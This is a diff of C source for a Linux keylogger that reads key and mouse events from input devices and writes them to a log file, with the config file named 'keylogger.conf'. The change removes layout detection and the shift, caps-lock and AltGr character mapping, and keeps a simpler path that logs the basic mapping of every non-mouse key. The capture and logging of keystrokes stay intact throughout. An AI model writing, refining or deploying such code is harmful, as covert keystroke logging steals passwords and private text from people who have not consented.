@@ -21,11 +21,7 @@
 
 // Configuration variables
 char config_log_directory[256] = {0};
-int config_dynamic_formatting = 1;  // Default to enabled
-
-// Keyboard layout variables
-char keyboard_layout[32] = "us";  // Default to US layout
-int is_international_layout = 0;  // Flag for international layouts
+int config_dynamic_formatting = 0;  // Disable dynamic formatting
 
 // Helper function to test bits in ioctl results
 static inline int test_bit(int bit, unsigned long *array) {
@@ -71,100 +67,6 @@ int int_to_string(int value, char *str) {
     return len;
 }
 
-// Function to detect system keyboard layout
-void detect_keyboard_layout() {
-    // Method 1: Try to get layout from environment variables
-    char *lang_env = getenv("LANG");
-    if (lang_env) {
-        // Extract language code from LANG variable (e.g., en_US.UTF-8 -> en)
-        char lang_code[16] = {0};
-        char *dot_pos = strchr(lang_env, '.');
-        if (dot_pos) {
-            int len = dot_pos - lang_env;
-            if (len > 2 && len < 16) {
-                strncpy(lang_code, lang_env, len);
-                lang_code[len] = '\0';
-                
-                // Check if it's an international layout
-                if (strcmp(lang_code, "de") == 0 ||  // German
-                    strcmp(lang_code, "fr") == 0 ||  // French
-                    strcmp(lang_code, "es") == 0 ||  // Spanish
-                    strcmp(lang_code, "it") == 0 ||  // Italian
-                    strcmp(lang_code, "pt") == 0 ||  // Portuguese
-                    strcmp(lang_code, "ru") == 0 ||  // Russian
-                    strcmp(lang_code, "pl") == 0 ||  // Polish
-                    strcmp(lang_code, "tr") == 0) {  // Turkish
-                    is_international_layout = 1;
-                }
-                
-                // Store the language code
-                strncpy(keyboard_layout, lang_code, sizeof(keyboard_layout) - 1);
-                keyboard_layout[sizeof(keyboard_layout) - 1] = '\0';
-                return;
-            }
-        }
-    }
-    
-    // Method 2: Try to read from setxkbmap (if available)
-    FILE *xkb_pipe = popen("setxkbmap -query 2>/dev/null | grep layout | cut -d':' -f2 | tr -d ' '", "r");
-    if (xkb_pipe) {
-        char xkb_layout[32];
-        if (fgets(xkb_layout, sizeof(xkb_layout), xkb_pipe)) {
-            xkb_layout[strcspn(xkb_layout, "\n")] = 0;  // Remove newline
-            if (strlen(xkb_layout) > 0) {
-                strncpy(keyboard_layout, xkb_layout, sizeof(keyboard_layout) - 1);
-                keyboard_layout[sizeof(keyboard_layout) - 1] = '\0';
-                
-                // Check if it's an international layout
-                if (strcmp(xkb_layout, "de") == 0 ||  // German
-                    strcmp(xkb_layout, "fr") == 0 ||  // French
-                    strcmp(xkb_layout, "es") == 0 ||  // Spanish
-                    strcmp(xkb_layout, "it") == 0 ||  // Italian
-                    strcmp(xkb_layout, "pt") == 0 ||  // Portuguese
-                    strcmp(xkb_layout, "ru") == 0 ||  // Russian
-                    strcmp(xkb_layout, "pl") == 0 ||  // Polish
-                    strcmp(xkb_layout, "tr") == 0) {  // Turkish
-                    is_international_layout = 1;
-                }
-                
-                pclose(xkb_pipe);
-                return;
-            }
-        }
-        pclose(xkb_pipe);
-    }
-    
-    // Method 3: Try to read from localectl (systemd systems)
-    FILE *locale_pipe = popen("localectl 2>/dev/null | grep 'X11 Layout' | cut -d':' -f2 | tr -d ' '", "r");
-    if (locale_pipe) {
-        char locale_layout[32];
-        if (fgets(locale_layout, sizeof(locale_layout), locale_pipe)) {
-            locale_layout[strcspn(locale_layout, "\n")] = 0;  // Remove newline
-            if (strlen(locale_layout) > 0) {
-                strncpy(keyboard_layout, locale_layout, sizeof(keyboard_layout) - 1);
-                keyboard_layout[sizeof(keyboard_layout) - 1] = '\0';
-                
-                // Check if it's an international layout
-                if (strcmp(locale_layout, "de") == 0 ||  // German
-                    strcmp(locale_layout, "fr") == 0 ||  // French
-                    strcmp(locale_layout, "es") == 0 ||  // Spanish
-                    strcmp(locale_layout, "it") == 0 ||  // Italian
-                    strcmp(locale_layout, "pt") == 0 ||  // Portuguese
-                    strcmp(locale_layout, "ru") == 0 ||  // Russian
-                    strcmp(locale_layout, "pl") == 0 ||  // Polish
-                    strcmp(locale_layout, "tr") == 0) {  // Turkish
-                    is_international_layout = 1;
-                }
-                
-                pclose(locale_pipe);
-                return;
-            }
-        }
-        pclose(locale_pipe);
-    }
-    
-    // If all methods fail, keep default "us" layout
-}
 
 // Function to read configuration from file
 int read_config(const char *config_file) {
@@ -315,14 +217,7 @@ const char* keycode_to_char(int keycode) {
 int main() {
     // Read configuration file
     read_config("keylogger.conf");
-    
-    // Detect system keyboard layout
-    detect_keyboard_layout();
 
-    // Modifier key states
-    int shift_pressed = 0;
-    int caps_lock_on = 0;
-    int alt_gr_pressed = 0;  // For international layouts
 
     // Find input devices
     int fd;
@@ -478,22 +373,6 @@ int main() {
                 if (ev.type == EV_KEY) { // Key event (press or release)
                     key_char = keycode_to_char(ev.code);
 
-                    // Handle modifier key events (press and release)
-                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
-                        if (ev.value == 1) {  // Key pressed
-                            shift_pressed = 1;
-                        } else if (ev.value == 0) {  // Key released
-                            shift_pressed = 0;
-                        }
-                    } else if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
-                        caps_lock_on = !caps_lock_on;  // Toggle caps lock on press
-                    } else if (ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT) {  // AltGr or Alt keys
-                        if (ev.value == 1) {  // Key pressed
-                            alt_gr_pressed = 1;
-                        } else if (ev.value == 0) {  // Key released
-                            alt_gr_pressed = 0;
-                        }
-                    }
 
                     // Only process key presses, not releases
                     if (ev.value == 1) {
@@ -510,173 +389,12 @@ int main() {
                                 strcat(mouse_msg, "\n");
                                 int mouse_len = strlen(mouse_msg);
                                 write(log_fd_evt, mouse_msg, mouse_len);
-                            } else if (ev.code != KEY_LEFTSHIFT && ev.code != KEY_RIGHTSHIFT && 
-                                       ev.code != KEY_LEFTCTRL && ev.code != KEY_RIGHTCTRL &&
-                                       ev.code != KEY_LEFTALT && ev.code != KEY_RIGHTALT &&
-                                       ev.code != KEY_CAPSLOCK) {
-                                // Handle character keys with modifiers (skip modifier keys themselves)
-                                char actual_char[16] = {0}; // Buffer for actual character (increased to handle longer strings like [BACKSPACE])
+                            } else {
+                                // Handle all non-mouse keys (everything except mouse buttons)
+                                char actual_char[16] = {0}; // Buffer for actual character
 
-                                // Map keycodes to characters considering modifier keys and configuration
-                                if (config_dynamic_formatting) {
-                                    // Dynamic formatting enabled - use modifier key states
-                                    if (ev.code >= KEY_A && ev.code <= KEY_Z) {
-                                        // Alphabet keys - handle shift and caps lock with layout consideration
-                                        // Normal behavior:
-                                        // - If caps lock is on and shift not pressed -> uppercase
-                                        // - If caps lock is off and shift pressed -> uppercase
-                                        // - If caps lock is on and shift pressed -> lowercase (shift overrides caps)
-                                        // - If caps lock is off and shift not pressed -> lowercase
-                                        if (!alt_gr_pressed) {
-                                            // Determine if this should be uppercase based on caps lock and shift state
-                                            int is_uppercase = (caps_lock_on && !shift_pressed) || (!caps_lock_on && shift_pressed);
-
-                                            if (is_uppercase) {
-                                                actual_char[0] = 'A' + (ev.code - KEY_A);
-                                            } else {
-                                                actual_char[0] = 'a' + (ev.code - KEY_A);
-                                            }
-                                        } else {
-                                            // AltGr combinations - use original mapping
-                                            strcpy(actual_char, key_char);
-                                        }
-                                    } else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
-                                        // Number keys - handle shift for symbols with layout consideration
-                                        if (shift_pressed && !alt_gr_pressed) {
-                                            // Handle different keyboard layouts for shift+numbers
-                                            if (strcmp(keyboard_layout, "de") == 0) {
-                                                // German layout: Shift+number gives symbols
-                                                switch(ev.code) {
-                                                    case KEY_1: strcpy(actual_char, "!"); break;
-                                                    case KEY_2: strcpy(actual_char, "\""); break;
-                                                    case KEY_3: strcpy(actual_char, "#"); break;
-                                                    case KEY_4: strcpy(actual_char, "$"); break;
-                                                    case KEY_5: strcpy(actual_char, "%"); break;
-                                                    case KEY_6: strcpy(actual_char, "&"); break;
-                                                    case KEY_7: strcpy(actual_char, "/"); break;
-                                                    case KEY_8: strcpy(actual_char, "("); break;
-                                                    case KEY_9: strcpy(actual_char, ")"); break;
-                                                    case KEY_0: strcpy(actual_char, "="); break;
-                                                    default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
-                                                }
-                                            } else if (strcmp(keyboard_layout, "fr") == 0) {
-                                                // French layout: Shift+number gives symbols
-                                                switch(ev.code) {
-                                                    case KEY_1: strcpy(actual_char, "+"); break;
-                                                    case KEY_2: strcpy(actual_char, "\""); break;
-                                                    case KEY_3: strcpy(actual_char, "*"); break;
-                                                    case KEY_4: strcpy(actual_char, "'"); break;
-                                                    case KEY_5: strcpy(actual_char, "("); break;
-                                                    case KEY_6: strcpy(actual_char, "-"); break;
-                                                    case KEY_7: strcpy(actual_char, "§"); break;  // Section symbol
-                                                    case KEY_8: strcpy(actual_char, "!"); break;
-                                                    case KEY_9: strcpy(actual_char, "ç"); break;  // ç for 9
-                                                    case KEY_0: strcpy(actual_char, "à"); break;  // à for 0
-                                                    default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
-                                                }
-                                            } else {
-                                                // US keyboard layout shift+number mappings (default)
-                                                switch(ev.code) {
-                                                    case KEY_1: strcpy(actual_char, "!"); break;
-                                                    case KEY_2: strcpy(actual_char, "@"); break;
-                                                    case KEY_3: strcpy(actual_char, "#"); break;
-                                                    case KEY_4: strcpy(actual_char, "$"); break;
-                                                    case KEY_5: strcpy(actual_char, "%"); break;
-                                                    case KEY_6: strcpy(actual_char, "^"); break;
-                                                    case KEY_7: strcpy(actual_char, "&"); break;
-                                                    case KEY_8: strcpy(actual_char, "*"); break;
-                                                    case KEY_9: strcpy(actual_char, "("); break;
-                                                    case KEY_0: strcpy(actual_char, ")"); break;
-                                                    default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
-                                                }
-                                            }
-                                        } else {
-                                            if (ev.code == KEY_0) {
-                                                actual_char[0] = '0';
-                                            } else {
-                                                actual_char[0] = '0' + (ev.code - KEY_1 + 1);
-                                            }
-                                        }
-                                    } else {
-                                        // Handle other keys that might have shift variants with layout consideration
-                                        if (!alt_gr_pressed) {  // Only handle shift, not AltGr combinations
-                                            // Handle different keyboard layouts for special characters
-                                            if (strcmp(keyboard_layout, "de") == 0) {
-                                                // German layout mappings
-                                                switch(ev.code) {
-                                                    case KEY_MINUS: strcpy(actual_char, shift_pressed ? "?" : "ß"); break;  // ß on minus, ? on shift+minus
-                                                    case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "`" : "´"); break;  // acute accent
-                                                    case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "Ü" : "ü"); break;
-                                                    case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "+" : "*"); break;
-                                                    case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "Ö" : "ö"); break;
-                                                    case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? "Ä" : "ä"); break;
-                                                    case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "^" : "#"); break;
-                                                    case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "°" : "°"); break;  // degree symbol
-                                                    case KEY_COMMA: strcpy(actual_char, shift_pressed ? ";" : ","); break;
-                                                    case KEY_DOT: strcpy(actual_char, shift_pressed ? ":" : "."); break;
-                                                    case KEY_SLASH: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
-                                                    case KEY_SPACE: strcpy(actual_char, " "); break;
-                                                    case KEY_TAB: strcpy(actual_char, "\t"); break;
-                                                    case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
-                                                    default:
-                                                        // For special keys, use the original mapping
-                                                        strcpy(actual_char, key_char);
-                                                        break;
-                                                }
-                                            } else if (strcmp(keyboard_layout, "fr") == 0) {
-                                                // French AZERTY layout mappings
-                                                switch(ev.code) {
-                                                    case KEY_MINUS: strcpy(actual_char, shift_pressed ? "6" : "6"); break;  // 6 is on the minus key in FR
-                                                    case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;  // + on shift+= and = on =
-                                                    case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "5" : "è"); break;  // 5 on shift+[ and è on [
-                                                    case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "£" : "\""); break;  // £ on shift+] and " on ]
-                                                    case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "*" : "µ"); break;  // * on shift+\ and µ on \ in French layout
-                                                    case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? "M" : "m"); break;  // M/m in French layout
-                                                    case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "%" : "'"); break;  // % on shift+' and ' on '
-                                                    case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "²" : "<"); break;  // ² on shift+` and < on ` in French layout
-                                                    case KEY_COMMA: strcpy(actual_char, shift_pressed ? "?" : ","); break;  // ? on shift+, and , on ,
-                                                    case KEY_DOT: strcpy(actual_char, shift_pressed ? "." : "."); break;  // . stays the same
-                                                    case KEY_SLASH: strcpy(actual_char, shift_pressed ? "/" : "§"); break;  // / on shift+/ and § on / in French layout
-                                                    case KEY_SPACE: strcpy(actual_char, " "); break;
-                                                    case KEY_TAB: strcpy(actual_char, "\t"); break;
-                                                    case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
-                                                    default:
-                                                        // For special keys, use the original mapping
-                                                        strcpy(actual_char, key_char);
-                                                        break;
-                                                }
-                                            } else {
-                                                // Default US layout mappings
-                                                switch(ev.code) {
-                                                    case KEY_MINUS: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
-                                                    case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;
-                                                    case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "{" : "["); break;
-                                                    case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "}" : "]"); break;
-                                                    case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "|" : "\\"); break;
-                                                    case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? ":" : ";"); break;
-                                                    case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "\"" : "'"); break;
-                                                    case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "~" : "`"); break;
-                                                    case KEY_COMMA: strcpy(actual_char, shift_pressed ? "<" : ","); break;
-                                                    case KEY_DOT: strcpy(actual_char, shift_pressed ? ">" : "."); break;
-                                                    case KEY_SLASH: strcpy(actual_char, shift_pressed ? "?" : "/"); break;
-                                                    case KEY_SPACE: strcpy(actual_char, " "); break;
-                                                    case KEY_TAB: strcpy(actual_char, "\t"); break;
-                                                    case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
-                                                    default:
-                                                        // For special keys, use the original mapping
-                                                        strcpy(actual_char, key_char);
-                                                        break;
-                                                }
-                                            }
-                                        } else {
-                                            // AltGr combinations - use original mapping
-                                            strcpy(actual_char, key_char);
-                                        }
-                                    }
-                                } else {
-                                    // Dynamic formatting disabled - use basic character mapping
-                                    strcpy(actual_char, key_char);
-                                }
+                                // Use basic character mapping
+                                strcpy(actual_char, key_char);
 
                                 int char_len = strlen(actual_char);
                                 write(log_fd_evt, actual_char, char_len);
